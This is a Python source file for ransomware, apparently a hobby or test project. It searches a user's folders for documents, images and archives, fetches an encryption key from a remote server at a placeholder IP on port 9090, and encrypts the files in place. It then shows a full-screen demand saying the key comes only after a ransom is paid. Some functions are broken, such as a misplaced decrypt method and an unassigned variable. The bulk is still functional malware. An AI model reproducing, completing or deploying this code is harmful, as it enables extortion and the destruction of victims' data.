import os
import random
from cryptography.fernet import Fernet
import tkinter as tk
import socket
from tkinter import *
from os import path

#python -m PyInstaller --onefile -w encrypt.py
#key = Fernet.generate_key()

class ransomware:
    EXCLUDED_DIRECTORIES = ('Program Files',
                            'Program Files (x86)',
                            'Windows',
                            '$Recycle.Bin',
                            'AppData',
                            #'paths',
            )
    
    EXTENSIONS = (
            '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
            '.odt', '.odp', '.ods', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
            '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
            '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
    )
    
    def find_files(self):
        file_paths = []
        directory = r'C:\Users\drew\Documents\testing'
        #f = open("paths/path.txt","w")
        for root, dirs, files in os.walk(directory):
            if any(s in root for s in self.EXCLUDED_DIRECTORIES):
                pass
            else:
                for file in files:
                    if file.endswith(self.EXTENSIONS):
                        TARGET = os.path.join(root, file)
                        file_paths.append(TARGET)
                        #f.write(TARGET+'\n')
                        print(root)
        #f.close()
        return file_paths
                        
    
    def encrypt_files(self, filename):
        key =  self.save_key()
        fernet = Fernet(key)
        with open(filename, "rb") as file:
            file_content = file.read()
        encrypted_content = fernet.encrypt(file_content)
        with open(filename, "wb") as file:
            file.write(encrypted_content)
        print(filename)

    def save_key(self):
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        IP_ADDRESS = 'PUT IP HERE'
        PORT = 9090
        client_socket.connect((IP_ADDRESS, PORT))
        key = client_socket.recv(1024)
        print(key)
        with open("thekey.key", "wb") as thekey:
            thekey.write(key)
        return key


ransomware = ransomware()   


def get_decryption_input():
    key_input = key_input.get()
    print(f'Key inputted: {key_input}')

def decrypt_files(self, filename):
    with open("thekey.key", "rb") as key:
        decrypt_key = key.read()
    with open(filename, "rb") as file:
        file_content = file.read()
    decrypted_content = Fernet(decrypt_key).decrypt(file_content)
    with open(filename, "wb") as file:
        file.write(decrypted_content)
    print(filename)

def decryption_screen():
    root = tk.Tk()
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    gap = (screen_height/50)
    root.geometry(f"{screen_width}x{screen_height}")
    root.configure(background="black")
    labe1 = tk.Label(root, text="YOUR IMPORTANT FILES HAVE BEEN ENCRYPTED")
    labe1.config(font=('tohoma', int(gap)))
    labe1.config(background='black',foreground='red')
    labe1.pack(anchor='n', ipady=20)

    img = tk.PhotoImage(file="icon-red-lock.png")
    img = img.subsample(4)
    labe2 = tk.Label(root, image=img)
    labe2.pack(anchor='n', ipady=20)

    labe3 = tk.Label(root, text="To unlock the encryption you will need a decryption key.")
    labe3.config(font=('tahoma', int(gap)))
    labe3.config(background="black", foreground="red")
    labe3.pack(anchor='n', ipady=20)

    labe4 = tk.Label(root, text="You will recieve the key once you have paid the ransom.\nInput the key below:")
    labe4.config(font=('tahoma',int(gap)))
    labe4.config(background='black',foreground='red')
    labe4.pack(anchor='n', ipady=20)

    user_input = tk.Entry(root, width=int(screen_width/10))
    user_input.pack(anchor='n', ipady=20)

    canvas1 = tk.Canvas(root, bg='black', highlightthickness=0, height=20, width=screen_width)
    canvas1.pack()

    key_submit = tk.Button(root, text='Submit', command=get_decryption_input)
    key_submit.pack(anchor='n')

    root.mainloop()


def ransom():
    file_paths = ransomware.find_files()
    #filepath = 'paths/path.txt'
    for file in file_paths:
        current_file = file.strip()
        ransomware.decrypt_files(current_file)

#    with open(filepath) as file:
#        line = file.readline()
#       while line:
#           filename = line.strip()
#           ransomware.encrypt_files(filename)
#           line = file.readline()
#        file.close()


if __name__ == '__main__':
    #if path.exists("paths") is False:
    #    os.mkdir("paths")
    ransom()
    decryption_screen()
